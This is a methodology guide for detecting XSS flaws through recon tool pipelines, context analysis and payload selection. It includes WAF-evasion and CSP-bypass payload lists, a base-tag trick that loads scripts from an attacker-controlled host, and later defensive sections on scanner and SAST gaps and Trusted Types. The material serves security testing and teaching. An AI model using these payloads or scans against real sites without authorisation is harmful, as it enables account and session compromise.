# 35 - XSS Detection & Scanning Methodology

## Overview

This document defines the systematic methodology for detecting XSS vulnerabilities through both automated scanning and manual testing. It covers the complete detection pipeline from parameter discovery through context analysis to payload verification, with dedicated sections for testing against WAF-protected and CSP-hardened targets.

---

## 1. Automated Detection Pipeline

### 1.1 Phase 1: Parameter Discovery & Fuzzing

**Objective**: Identify all user-controllable inputs and test for character reflection.

**Step 1 - Enumerate Input Vectors**:
```bash
# Discover parameters from web archives
paramspider -d target.com --output all_params.txt

# Crawl for live endpoints with parameters
katana -u https://target.com -d 5 -jc -kf -ef woff,css,png,jpg \
  -o crawled_urls.txt

# Combine URL sources
gau target.com --threads 5 --o gau_urls.txt
waybackurls target.com > wayback_urls.txt

# Merge and deduplicate
cat all_params.txt crawled_urls.txt gau_urls.txt wayback_urls.txt | \
  sort -u | uro > unique_urls.txt

# Discover hidden parameters
arjun -i unique_urls.txt -m GET -oT hidden_params.txt
```

**Step 2 - Reflection Analysis**:
```bash
# Check which parameters reflect unfiltered characters
cat unique_urls.txt | kxss | tee reflections.txt

# Alternative with custom probe string
cat unique_urls.txt | Gxss -p 'v0rt3x"<>'"'"'`{}()' | tee gxss_results.txt

# Filter for high-value reflections (< and > unfiltered)
grep -E "Unfiltered.*[<>]" reflections.txt > high_value_reflections.txt
```

**Step 3 - Automated Scanning**:
```bash
# Dalfox scan on confirmed reflections
cat high_value_reflections.txt | dalfox pipe \
  --deep-domxss \
  --blind "your.xss.ht" \
  -w 30 \
  -o dalfox_results.json \
  --format json

# XSStrike for WAF-protected targets
while read url; do
  python3 xsstrike.py -u "$url" --crawl -l 2 2>/dev/null
done < high_value_reflections.txt

# Nuclei headless XSS scanning
nuclei -l unique_urls.txt -tags xss -headless -rl 20 -o nuclei_xss.txt
```

### 1.2 Phase 2: Context Detection Algorithm

When automated tools report a reflection, determine the injection context to select appropriate payloads.

**Context Detection Logic**:

```
INPUT: reflected_value, response_body
OUTPUT: context_type, escape_sequence, recommended_payloads

1. LOCATE reflection in response body
2. ANALYZE surrounding HTML/JS:

   IF reflection is between HTML tags (e.g., <div>REFLECTED</div>):
     context = "HTML_BODY"
     test: <img src=x onerror=alert(1)>
     test: <svg/onload=alert(1)>

   ELSE IF reflection is inside an HTML attribute value:
     IF attribute is quoted with double quotes:
       context = "HTML_ATTR_DOUBLE_QUOTED"
       test: " onmouseover=alert(1) "
       test: "><svg/onload=alert(1)>
     ELSE IF attribute is quoted with single quotes:
       context = "HTML_ATTR_SINGLE_QUOTED"
       test: ' onmouseover=alert(1) '
       test: '><svg/onload=alert(1)>
     ELSE (unquoted attribute):
       context = "HTML_ATTR_UNQUOTED"
       test: onmouseover=alert(1)
       test: ><svg/onload=alert(1)>

   ELSE IF reflection is inside a <script> block:
     IF inside a JavaScript string (single-quoted):
       context = "JS_STRING_SINGLE"
       test: ';alert(1)//
       test: '</script><svg/onload=alert(1)>
     ELSE IF inside a JavaScript string (double-quoted):
       context = "JS_STRING_DOUBLE"
       test: ";alert(1)//
       test: "</script><svg/onload=alert(1)>
     ELSE IF inside a template literal:
       context = "JS_TEMPLATE_LITERAL"
       test: ${alert(1)}
     ELSE (raw JavaScript context):
       context = "JS_RAW"
       test: ;alert(1)//
       test: -alert(1)-

   ELSE IF reflection is inside an HTML comment:
     context = "HTML_COMMENT"
     test: --><svg/onload=alert(1)>

   ELSE IF reflection is in a URL/href attribute:
     context = "URL_CONTEXT"
     test: javascript:alert(1)
     test: data:text/html,<script>alert(1)</script>

   ELSE IF reflection is inside a <style> block or style attribute:
     context = "CSS_CONTEXT"
     test: </style><svg/onload=alert(1)>
```

### 1.3 Phase 3: Payload Selection Based on Context

**Payload Selection Matrix**:

| Context | Primary Payloads | Escape Needed |
|---------|-----------------|---------------|
| HTML_BODY | `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>` | None |
| HTML_ATTR_DOUBLE | `" onfocus=alert(1) autofocus "`, `"><svg/onload=alert(1)>` | `"` |
| HTML_ATTR_SINGLE | `' onfocus=alert(1) autofocus '`, `'><svg/onload=alert(1)>` | `'` |
| JS_STRING_DOUBLE | `";alert(1)//`, `"</script><svg/onload=alert(1)>` | `"` |
| JS_STRING_SINGLE | `';alert(1)//`, `'</script><svg/onload=alert(1)>` | `'` |
| JS_TEMPLATE | `${alert(1)}` | Backtick |
| HTML_COMMENT | `--><svg/onload=alert(1)>` | `-->` |
| URL_CONTEXT | `javascript:alert(1)` | Protocol |
| CSS_CONTEXT | `</style><svg/onload=alert(1)>` | `</style>` |

### 1.4 Phase 4: Verification of Execution

**Automated Verification Methods**:

```bash
# Dalfox with headless verification
dalfox url "https://target.com/?q=test" --force-headless-verification

# Nuclei headless mode (waits for alert dialog)
nuclei -u "https://target.com/?q=PAYLOAD" -headless -tags xss
```

**Custom verification with Puppeteer** (Node.js):
```javascript
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  let alertFired = false;
  page.on('dialog', async dialog => {
    alertFired = true;
    console.log('XSS CONFIRMED: ' + dialog.message());
    await dialog.dismiss();
  });
  await page.goto(TARGET_URL_WITH_PAYLOAD);
  await new Promise(r => setTimeout(r, 3000));
  if (!alertFired) console.log('No XSS triggered');
  await browser.close();
})();
```

### 1.5 Phase 5: False Positive Reduction

**Common False Positives and How to Eliminate Them**:

| False Positive Type | Detection Method | Mitigation |
|-------------------|-----------------|-----------|
| Reflected but HTML-encoded | Check if `<` becomes `&lt;` | Verify raw chars in response |
| Reflected in non-executing context | Check if in `<textarea>`, `<title>`, comments | Test context escape first |
| CSP blocks execution | Check CSP headers | Test CSP bypass or note as partial |
| Framework auto-escaping | Angular/React template escaping | Test framework-specific bypasses |
| WAF blocking execution | Request blocked (403/dropped) | Use evasion payloads |

**Verification Checklist**:
```
[ ] Payload characters reflect without encoding
[ ] Reflection is in an executable context
[ ] No CSP blocks inline script execution
[ ] Browser actually executes the payload (headless test)
[ ] Payload works across multiple browsers
[ ] Vulnerability is reproducible consistently
```

---

## 2. Manual Detection Methodology

### 2.1 Systematic Input Identification

**Input Vector Checklist**:
```
URL Components:
  [ ] Query string parameters (?key=value)
  [ ] Path segments (/page/INJECT/view)
  [ ] Fragment/hash (#section=INJECT)
  [ ] Full URL in redirect parameters (?url=INJECT, ?next=INJECT)

HTTP Headers:
  [ ] Referer header
  [ ] User-Agent header
  [ ] X-Forwarded-For / X-Forwarded-Host
  [ ] Cookie values
  [ ] Accept-Language
  [ ] Custom application headers

Request Body:
  [ ] Form fields (text, hidden, textarea)
  [ ] JSON body values
  [ ] XML/SOAP body values
  [ ] Multipart file upload (filename, content-type)

Other:
  [ ] WebSocket messages
  [ ] PostMessage listeners
  [ ] Local/session storage values read by JS
  [ ] URL fragment read by JS (location.hash)
```

### 2.2 HTML Source Analysis

**Manual Reflection Discovery Process**:

```
Step 1: Inject unique canary string
  - Use: v0rt3xCANARY123 (no special chars, just unique)
  - Submit in every parameter

Step 2: Search response for canary
  - View source (Ctrl+U), search for canary
  - Check all locations where canary appears
  - Note: same canary may reflect in multiple locations

Step 3: Analyze each reflection context
  - For each reflection, identify:
    a) The enclosing HTML/JS construct
    b) Characters that are filtered/encoded
    c) Characters that pass through unmodified

Step 4: Determine blocked characters
  - Test individually: < > " ' ` / \ ( ) { } ; = space
  - Record which are blocked, encoded, or passed through

Step 5: Craft context-appropriate payload
  - Use only characters that pass through
  - Match the escape sequence to the context
```

### 2.3 JavaScript Code Review for DOM XSS

**Dangerous Sources** (where user input enters JS):
```javascript
// URL-based sources
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
location.pathname

// Storage sources
localStorage.getItem()
sessionStorage.getItem()
document.cookie

// Communication sources
window.name
// postMessage data (event.data)
```

**Dangerous Sinks** (where input causes execution):
```javascript
// Direct execution sinks
// eval(), Function(), setTimeout(string), setInterval(string)

// HTML injection sinks
element.innerHTML
element.outerHTML
// document.write(), document.writeln()

// URL sinks
// location.href = ..., location.assign(), location.replace()
// window.open()

// jQuery sinks
// $(userInput), $.html(userInput), $.append(userInput)
```

**Source-to-Sink Tracing Workflow**:
```
1. Open DevTools > Sources tab
2. Set breakpoints on known sinks:
   - Right-click > "Break on subtree modifications" for DOM nodes
   - Use DOM breakpoints for innerHTML changes
3. Inject canary into URL hash/params
4. Trace execution from source to sink
5. Identify if sanitization exists in the path
6. Craft payload that bypasses sanitization
```

### 2.4 Browser-Based Testing Workflow

```
Phase 1: Observe Normal Behavior
  1. Browse application normally, map all inputs
  2. Note any reflected content in pages
  3. Identify JavaScript-heavy features (SPAs, dynamic rendering)

Phase 2: Probe with Canary
  1. Inject unique string in every field
  2. Check responses for reflections
  3. Map reflection locations and contexts

Phase 3: Test Special Characters
  1. For each reflection, test: <>"'`;/\(){}
  2. Record what gets through unmodified
  3. Test combinations: "><, '>, </script>

Phase 4: Attempt Execution
  1. Start with simplest payload for context
  2. Escalate complexity if filtered
  3. Try alternative tags: <svg>, <img>, <details>, <math>
  4. Try alternative events: onfocus, onblur, onmouseover, onerror
  5. Confirm with alert(), confirm(), or unique callback

Phase 5: Verify & Document
  1. Reproduce in clean browser (incognito)
  2. Test in multiple browsers
  3. Document full request/response chain
  4. Assess impact (cookie theft, session hijack, etc.)
```

### 2.5 Proxy-Based Testing (Burp Suite / ZAP)

```
1. Configure browser proxy (127.0.0.1:8080)
2. Browse target to build sitemap
3. Review Proxy > HTTP History for reflected parameters
4. For each reflected parameter:
   a. Send to Repeater
   b. Test character filtering
   c. Identify context
   d. Craft payload
   e. Verify in browser
5. Use Intruder for automated payload spraying
6. Monitor Scanner results for passive XSS findings
```

---

## 3. Detection Evasion Testing

### 3.1 WAF-Protected Targets

**WAF Detection**:
```bash
# Identify WAF
wafw00f https://target.com

# Common WAF signatures in response:
# 403 Forbidden with specific body text
# Cloudflare: cf-ray header, "Attention Required" page
# AWS WAF: x-amzn-RequestId header
# Akamai: AkamaiGHost header
# ModSecurity: "ModSecurity" in error page
```

**WAF Bypass Strategies**:

| Strategy | Technique | Example |
|----------|----------|---------|
| Case variation | Mixed case tags/events | `<ScRiPt>alert(1)</ScRiPt>` |
| Tag alternatives | Less common HTML tags | `<details/open/ontoggle=alert(1)>` |
| Event handler alternatives | Uncommon events | `<body onpageshow=alert(1)>` |
| Encoding | Double URL encode | `%253Cscript%253Ealert(1)%253C/script%253E` |
| Encoding | HTML entities | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| Encoding | Unicode escapes | `\u003cscript\u003ealert(1)` |
| Null bytes | Inject null bytes | `<scr%00ipt>alert(1)</scr%00ipt>` |
| Comment injection | Break up keywords | `<scr<!---->ipt>alert(1)</scr<!---->ipt>` |
| Whitespace abuse | Tab/newline in tags | `<svg/onload\x09=alert(1)>` |
| Parameter pollution | Split across params | `?q=<script>&q=alert(1)</script>` |
| Content-Type abuse | Unexpected types | Send as `application/x-www-form-urlencoded` |
| Chunked encoding | Transfer-Encoding | Split payload across chunks |

**WAF Bypass Payload Progression**:
```html
<!-- Level 1: Basic (no WAF) -->
<script>alert(1)</script>

<!-- Level 2: Tag alternatives -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Level 3: Event handler alternatives -->
<details/open/ontoggle=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

<!-- Level 4: Encoding bypass -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Level 5: Concatenation/construction -->
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>

<!-- Level 6: Advanced obfuscation -->
<svg/onload=Function`a]alert\`1\``>
```

**Source**: [https://undercodetesting.com/xss-payload-waf-bypass-advanced-techniques-for-modern-web-security/](https://undercodetesting.com/xss-payload-waf-bypass-advanced-techniques-for-modern-web-security/)
**Source**: [https://github.com/gprime31/WAF-bypass-xss-payloads](https://github.com/gprime31/WAF-bypass-xss-payloads)

### 3.2 CSP-Aware Payload Selection

**CSP Analysis**:
```bash
# Extract CSP header
curl -s -I https://target.com | grep -i "content-security-policy"

# Analyze CSP with Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/

# Check for common weaknesses:
# - unsafe-inline: standard XSS payloads work
# - unsafe-eval: construction-based payloads work
# - Wildcard (*): external script loading works
# - JSONP endpoints on whitelisted domains
# - Missing base-uri: base tag injection
# - Nonce leakage: reuse nonce in payload
```

**CSP Bypass Techniques**:

| CSP Configuration | Bypass Method |
|------------------|--------------|
| `script-src 'unsafe-inline'` | Standard inline `<script>` tags work |
| `script-src 'unsafe-eval'` | `setTimeout(string)`, `Function()` work |
| `script-src 'self'` | Find JSONP endpoint on same origin, inject via callback |
| `script-src cdn.example.com` | Find XSS in allowed CDN, or upload script to CDN |
| `script-src 'nonce-ABC'` | If nonce is predictable/static, reuse it |
| `base-uri` missing | `<base href="https://attacker.com/">` then relative scripts load from attacker |
| `default-src` only | May not cover `script-src` properly |
| `script-src *` wildcard | Load external script from attacker-controlled domain |

**JSONP CSP Bypass Example**:
```html
<!-- If script-src allows a domain with JSONP -->
<script src="https://allowed-domain.com/api?callback=alert(1)//">
</script>
```

**Source**: [https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques](https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques)
**Source**: [https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

### 3.3 Framework Detection & Framework-Specific Testing

**Framework Identification**:
```
Angular: Look for ng-app, ng-model attributes, {{ }} expressions
React: Look for data-reactroot, _reactRootContainer, JSX patterns
Vue.js: Look for v-bind, v-model, {{ }} expressions, __vue__
jQuery: Look for $.ajax, jQuery calls, $ selectors
```

**Framework-Specific XSS Vectors**:

```html
<!-- AngularJS (template injection) -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- Vue.js (template injection in v2) -->
{{_c.constructor('alert(1)')()}}

<!-- React (dangerouslySetInnerHTML) -->
<!-- Look for: dangerouslySetInnerHTML={{__html: userInput}} -->

<!-- jQuery (selector injection) -->
<!-- If user input enters $() selector: -->
<!-- $('<img/src=x onerror=alert(1)>') -->
```

### 3.4 Obfuscation Techniques for Filter Bypass

**JavaScript Obfuscation Methods**:
```javascript
// String construction
window['al'+'ert'](1)
window['\x61lert'](1)
window['\u0061lert'](1)
top[/al/.source+/ert/.source](1)
self[atob('YWxlcnQ=')](1)

// Function construction
Function`alert\`1\``
[].filter.constructor('alert(1)')()
[].map.constructor('alert(1)')()

// Template literal abuse
alert`1`

// Encoding chains
// String.fromCharCode(97,108,101,114,116,40,49,41)
// atob('YWxlcnQoMSk=')
// unescape('%61%6c%65%72%74%28%31%29')
```

---

## 4. Automated Pipeline: End-to-End Example

```bash
#!/bin/bash
# Full automated XSS detection pipeline
TARGET="target.com"
BLIND_XSS="your.xss.ht"
OUTPUT_DIR="./xss_results_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 1: Parameter Discovery"
paramspider -d "$TARGET" --output "$OUTPUT_DIR/paramspider.txt" 2>/dev/null
gau "$TARGET" --threads 5 --o "$OUTPUT_DIR/gau.txt" 2>/dev/null
katana -u "https://$TARGET" -d 3 -jc -o "$OUTPUT_DIR/katana.txt" 2>/dev/null
cat "$OUTPUT_DIR"/*.txt | sort -u | uro > "$OUTPUT_DIR/all_urls.txt"

echo "[*] Phase 2: Reflection Analysis"
cat "$OUTPUT_DIR/all_urls.txt" | kxss 2>/dev/null > "$OUTPUT_DIR/reflections.txt"

echo "[*] Phase 3: Automated Scanning"
cat "$OUTPUT_DIR/reflections.txt" | \
  dalfox pipe --deep-domxss -b "$BLIND_XSS" -w 20 \
  -o "$OUTPUT_DIR/dalfox_results.json" --format json 2>/dev/null

echo "[*] Phase 4: Nuclei XSS Scan"
nuclei -l "$OUTPUT_DIR/all_urls.txt" -tags xss -rl 30 \
  -o "$OUTPUT_DIR/nuclei_xss.txt" 2>/dev/null

echo "[*] Results Summary"
echo "Total URLs: $(wc -l < "$OUTPUT_DIR/all_urls.txt")"
echo "Reflections: $(wc -l < "$OUTPUT_DIR/reflections.txt")"
echo "Dalfox findings: $(wc -l < "$OUTPUT_DIR/dalfox_results.json" 2>/dev/null || echo 0)"
echo "Nuclei findings: $(wc -l < "$OUTPUT_DIR/nuclei_xss.txt" 2>/dev/null || echo 0)"
```

---

## References

- OWASP XSS Testing Guide: [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- PortSwigger XSS Contexts: [https://portswigger.net/web-security/cross-site-scripting/contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- HackerOne How to Find XSS: [https://www.hackerone.com/blog/how-find-xss](https://www.hackerone.com/blog/how-find-xss)
- OWASP XSS Filter Evasion: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- WAF Bypass Payloads: [https://github.com/gprime31/WAF-bypass-xss-payloads](https://github.com/gprime31/WAF-bypass-xss-payloads)
- CSP Bypass Techniques: [https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques](https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques)
- CSP Bypass Advanced: [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- HackTricks XSS: [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- WAF Bypass 2025: [https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b](https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b)
- Penligent XSS Cheat Sheet: [https://www.penligent.ai/hackinglabs/xss-cheat-sheet-advanced-penetration-testing-techniques-and-payload-examples/](https://www.penligent.ai/hackinglabs/xss-cheat-sheet-advanced-penetration-testing-techniques-and-payload-examples/)
- PortSwigger DOM XSS: [https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)

---
## [2024-2026 Research Update]

### AI/ML-Based XSS Detection

#### KameleonFuzz: Evolutionary Fuzzing with Attack Grammar

KameleonFuzz applies evolutionary fuzzing techniques with a formal attack grammar to generate XSS payloads that bypass WAFs and sanitizers. Key characteristics:

- **Attack grammar**: Formal grammar defining valid XSS payload structures, enabling systematic mutation
- **Evolutionary approach**: Genetic algorithm evolves payloads based on fitness (bypass success rate)
- **Grammar-guided mutation**: Mutations respect the attack grammar, producing syntactically valid payloads
- **WAF feedback loop**: Uses WAF responses (block/allow) as fitness signal to evolve evasive payloads

**Effectiveness**: KameleonFuzz discovered bypasses in ModSecurity CRS, Cloudflare, and AWS WAF that manual testing missed. The grammar-based approach generates payloads that maintain semantic validity while maximizing evasion.

#### GAXSS: Genetic Algorithm Payload Generation

GAXSS uses genetic algorithms specifically tuned for XSS payload generation:

- **Chromosome encoding**: XSS payloads encoded as chromosomes with tag, event handler, and payload genes
- **Crossover operations**: Combines successful payload fragments from different parents
- **Mutation operations**: Applies encoding transformations (hex, unicode, case mixing) as mutations
- **Selection pressure**: Payloads that bypass more filters have higher reproduction probability

**Results**: GAXSS generated novel payloads that bypassed 7 out of 10 tested WAFs, including payloads using uncommon event handlers and tag combinations that were absent from existing payload databases.

#### FuzzGuard: Reducing Redundant Fuzzing Requests

FuzzGuard addresses the efficiency problem in XSS fuzzing:

- **41% reduction** in redundant/duplicate requests compared to naive fuzzing
- **Prediction model**: ML model predicts whether a payload variation will produce a different response
- **Coverage tracking**: Monitors code coverage to avoid re-testing equivalent code paths
- **Prioritization**: Ranks untested payloads by predicted likelihood of discovering new behavior

**Practical impact**: Reduces scan time from hours to minutes for large web applications by eliminating payloads that would trigger the same code paths as already-tested ones.

#### LLM-Assisted Seed Generation

Large Language Models are being used to generate initial seed payloads for fuzzing:

- **Context-aware generation**: LLMs analyze the target's technology stack and generate technology-specific payloads
- **Mutation suggestion**: Given a blocked payload, LLMs suggest semantically equivalent alternatives
- **Bypass reasoning**: LLMs can reason about WHY a payload was blocked and suggest targeted modifications
- **Limitations**: LLMs may generate syntactically plausible but semantically invalid payloads; human review still required

### Scanner Blind Spots

Modern XSS scanners have systematic blind spots that manual testing or specialized tools must cover:

| Scanner | Blind Spot | Root Cause | Impact |
|---------|-----------|------------|--------|
| **Burp Suite** | Prototype pollution to XSS chains | Does not model JavaScript prototype chain manipulation | Misses PP->XSS gadgets in frameworks |
| **Burp Suite** | WebSocket-relayed stored XSS | Scanner does not maintain WebSocket connections | Misses chat/real-time app XSS |
| **ZAP** | Shadow DOM / Declarative Shadow DOM XSS | DOM parser does not traverse shadow roots | Misses Web Component XSS |
| **ZAP** | Import map poisoning | Does not test `<script type="importmap">` injection | Misses module hijacking |
| **Nuclei** | DOM-based XSS (all variants) | Template-based, no JavaScript execution engine | Cannot detect client-side-only sinks |
| **Nuclei** | Mutation XSS (mXSS) | Cannot detect parser differential behavior | Misses sanitizer bypass via mXSS |
| **Dalfox** | Multi-step stored XSS | Stateless scanning, no session persistence | Misses XSS requiring authentication + storage |
| **Dalfox** | Framework-specific template injection | Generic payloads, no framework detection | Misses Angular/Vue template XSS |
| **XSStrike** | HTTP/2-specific header injection | HTTP/1.1 only | Misses HTTP/2 pseudo-header XSS |
| **All scanners** | PDF.js / viewer XSS | Do not test PDF rendering pipelines | Misses CVE-2024-4367-style vulns |
| **All scanners** | Browser extension XSS | Cannot test extension content scripts | Misses extension-context XSS |
| **All scanners** | OAuth callback parameter XSS | Do not model OAuth flows | Misses error_description/state XSS |

**Key takeaway**: No single scanner covers all XSS vectors. A comprehensive methodology requires layering automated scanning with manual testing for blind spot categories.

### SAST Limitations for DOM XSS

Static Application Security Testing tools have fundamental limitations when detecting DOM-based XSS:

#### Semgrep

- **Strengths**: Fast, pattern-based, good for known sink patterns (`innerHTML`, `document.write`)
- **Limitations**:
  - Cannot track taint through complex data flows across multiple files
  - Misses indirect sink access (e.g., `element[prop] = userInput` where `prop` is `"innerHTML"`)
  - No understanding of framework-specific rendering (React JSX, Vue templates)
  - Cannot detect DOM clobbering gadgets (requires understanding of global variable resolution)
  - Limited interprocedural analysis (misses taint passed through callbacks or promises)

#### CodeQL

- **Strengths**: Full interprocedural taint analysis, understands JavaScript semantics
- **Limitations**:
  - High false positive rate for DOM XSS (30-40% in typical codebases)
  - Cannot model browser DOM API behavior accurately
  - Misses XSS through `eval()` when the evaluated string is constructed dynamically
  - Does not model prototype pollution as a taint source
  - Database build time makes it impractical for real-time CI/CD on large codebases
  - Custom sinks (e.g., framework-specific template rendering) require manual rule authoring

#### SonarQube

- **Strengths**: Good integration with CI/CD, tracks taint through common patterns
- **Limitations**:
  - JavaScript/TypeScript analysis is less mature than Java/C# analysis
  - Misses taint through `postMessage` handlers (does not model cross-window communication)
  - Cannot detect mutation XSS (requires understanding of HTML parser behavior)
  - Limited support for modern JavaScript patterns (optional chaining, destructuring as taint propagation)
  - Free Community Edition has significantly reduced DOM XSS detection compared to Enterprise

#### Common SAST Gaps for DOM XSS

All three tools share these fundamental limitations:

1. **No browser execution model**: Cannot detect XSS that requires understanding how browsers parse and execute HTML/JS
2. **No sanitizer modeling**: Cannot determine if a sanitizer (DOMPurify, sanitize-html) is correctly applied or bypassable
3. **No CSP awareness**: Cannot assess whether CSP would prevent the detected XSS from executing
4. **Framework blind spots**: Each framework (React, Vue, Angular, Svelte) has unique rendering semantics that generic SAST rules miss
5. **Dynamic property access**: `obj[userInput]` where `userInput` could be `"innerHTML"` is a common blind spot

### Trusted Types as Detection Tool

#### Overview

Trusted Types is a browser API that prevents DOM XSS by requiring that values assigned to dangerous sinks (innerHTML, document.write, eval, etc.) are wrapped in typed objects created by explicitly defined policies. Deployed by Google internally, it has demonstrated **61% reduction in DOM XSS vulnerabilities**.

#### How Trusted Types Work

```javascript
// Without Trusted Types - vulnerable
element.innerHTML = userInput;

// With Trusted Types enforced - this throws a TypeError
element.innerHTML = userInput;
// TypeError: This document requires 'TrustedHTML' assignment.

// With Trusted Types - safe pattern
const policy = trustedTypes.createPolicy('sanitizer', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput); // OK
```

#### CSP Header for Trusted Types

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types sanitizer default
```

#### Report-Only Mode for Detection

The most powerful use of Trusted Types is as a **detection tool** in report-only mode:

```
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types none; report-uri /csp-violations
```

**Workflow**:
1. Deploy Trusted Types in report-only mode (no enforcement, no breakage)
2. Collect violation reports identifying every DOM XSS sink usage
3. Each report identifies the exact sink, the violating script, and the call stack
4. Triage reports to identify actual vulnerabilities vs. safe usage patterns
5. Create Trusted Types policies for legitimate sink usage
6. Gradually move to enforcement mode

#### Google's Results

- **61% of DOM XSS bugs prevented** at Google after Trusted Types enforcement
- **Report-only mode** identified hundreds of previously unknown DOM XSS sinks in production code
- **Zero false negatives** for covered sinks (innerHTML, document.write, eval, script.src, etc.)
- **Coverage gap**: Trusted Types does not cover `location.href` assignment, `window.open()`, or `postMessage()` sinks

#### Trusted Types Detection Advantages Over SAST

| Aspect | SAST | Trusted Types (report-only) |
|--------|------|---------------------------|
| False positives | 30-40% | 0% (runtime, actual execution) |
| False negatives | High (cannot model DOM) | 0% for covered sinks |
| Dynamic taint tracking | No | Yes (runtime) |
| Framework awareness | Limited | Full (runs in real framework) |
| Setup effort | Low | Medium (CSP header deployment) |
| Production monitoring | No | Yes (continuous) |

#### Limitations

- Not supported in Firefox (as of 2026; behind flag `dom.security.trusted_types.enabled`)
- Does not cover navigation sinks (`location.href`, `location.assign()`)
- Does not cover `postMessage()` as a taint sink
- Requires CSP header deployment (may conflict with existing CSP)
- Report volume can be high in large applications (rate limiting needed)

### Updated References

- KameleonFuzz: [https://github.com/nicedayzhu/KameleonFuzz](https://github.com/nicedayzhu/KameleonFuzz)
- GAXSS (Genetic Algorithm XSS): [https://dl.acm.org/doi/10.1145/3551349.3556948](https://dl.acm.org/doi/10.1145/3551349.3556948)
- FuzzGuard: [https://www.usenix.org/conference/usenixsecurity20/presentation/zong](https://www.usenix.org/conference/usenixsecurity20/presentation/zong)
- Trusted Types W3C Spec: [https://w3c.github.io/trusted-types/dist/spec/](https://w3c.github.io/trusted-types/dist/spec/)
- Google Trusted Types Results: [https://web.dev/articles/trusted-types](https://web.dev/articles/trusted-types)
- Semgrep XSS Rules: [https://semgrep.dev/r?q=xss](https://semgrep.dev/r?q=xss)
- CodeQL XSS Queries: [https://codeql.github.com/codeql-query-help/javascript/js-xss/](https://codeql.github.com/codeql-query-help/javascript/js-xss/)

---

## [2026 API XSS Research Update]

### API-Specific XSS Testing Methodology

#### API Parameter Pollution Testing
- Test duplicate parameter handling: send `?q=benign&q=<script>alert(1)</script>` and observe which value the WAF inspects versus which the backend uses
- Test framework-specific behavior: ASP.NET concatenates with commas, PHP takes last, Express creates arrays, Tomcat uses first
- Verify WAF parameter merging matches backend behavior
- Test array parameters: `?q[]=part1&q[]=<script>alert(1)</script>` for frameworks that create arrays

#### Content-Type Confusion Testing
- Switch Content-Type between `application/x-www-form-urlencoded`, `multipart/form-data`, and `application/json` while keeping the same XSS payload
- Test API responses for correct `Content-Type: application/json` header (not `text/html`)
- Verify `X-Content-Type-Options: nosniff` on all API responses including errors
- Test file upload endpoints: upload SVG/HTML with manipulated Content-Type headers
- Check if uploaded files are served from same origin or separate domain
- Test presigned URL uploads for HTML/SVG/JS file acceptance

#### Webhook Payload XSS Testing
- Send webhook payloads with XSS in user-controlled fields (names, descriptions, metadata)
- Verify webhook signature verification is enforced (not optional)
- Check admin dashboards that render webhook data for HTML encoding
- Test across Stripe, GitHub, Slack, and custom webhook receivers

#### API Documentation Page Testing
- Test Swagger UI version: versions 3.14.1-3.38.0 vulnerable to DOM XSS via outdated DOMPurify
- Check if `?url=` parameter is enabled (disabled by default in Swagger UI 4.1.3+)
- Test GraphiQL `query` parameter for reflected XSS (CVE-2026-42794 backslash bypass)
- Check for SRI on CDN-loaded scripts in GraphiQL (CVE-2026-59286)
- Test OpenAPI spec injection: XSS in `description`, `example`, and `default` values

#### Error Handling XSS Testing
- Test all response codes (200, 400, 404, 429, 500) for reflected input
- Send XSS payloads in API version strings, endpoint paths, and query parameters
- Check framework debug pages for user input reflection (Django DEBUG=True, Laravel APP_DEBUG=true)
- Test GraphQL error responses for reflected input in the `message` field
- Test validation error messages: send invalid input and check if field names or error text are reflected as HTML

#### WAFFLED-Style WAF Bypass Testing
- Test JSON body XSS: embed payloads in JSON values and check if WAF inspects JSON bodies
- Test multipart boundary manipulation: non-standard but RFC-valid boundary strings
- Test body-size limits: pad requests to exceed Cloudflare (128 KiB) and AWS WAF (8 KB) inspection limits
- Test chunked transfer encoding: split XSS keywords across chunks
- Test Content-Type switching combined with encoding and padding as a layered bypass strategy

#### SSE and WebSocket XSS Testing
- Test SSE endpoints for CRLF injection in `event`, `id`, and `data` fields
- Verify SSE serialization strips both `\r` and `\n` (not just `\n`)
- Test WebSocket message rendering: send HTML/JS payloads in chat-style messages
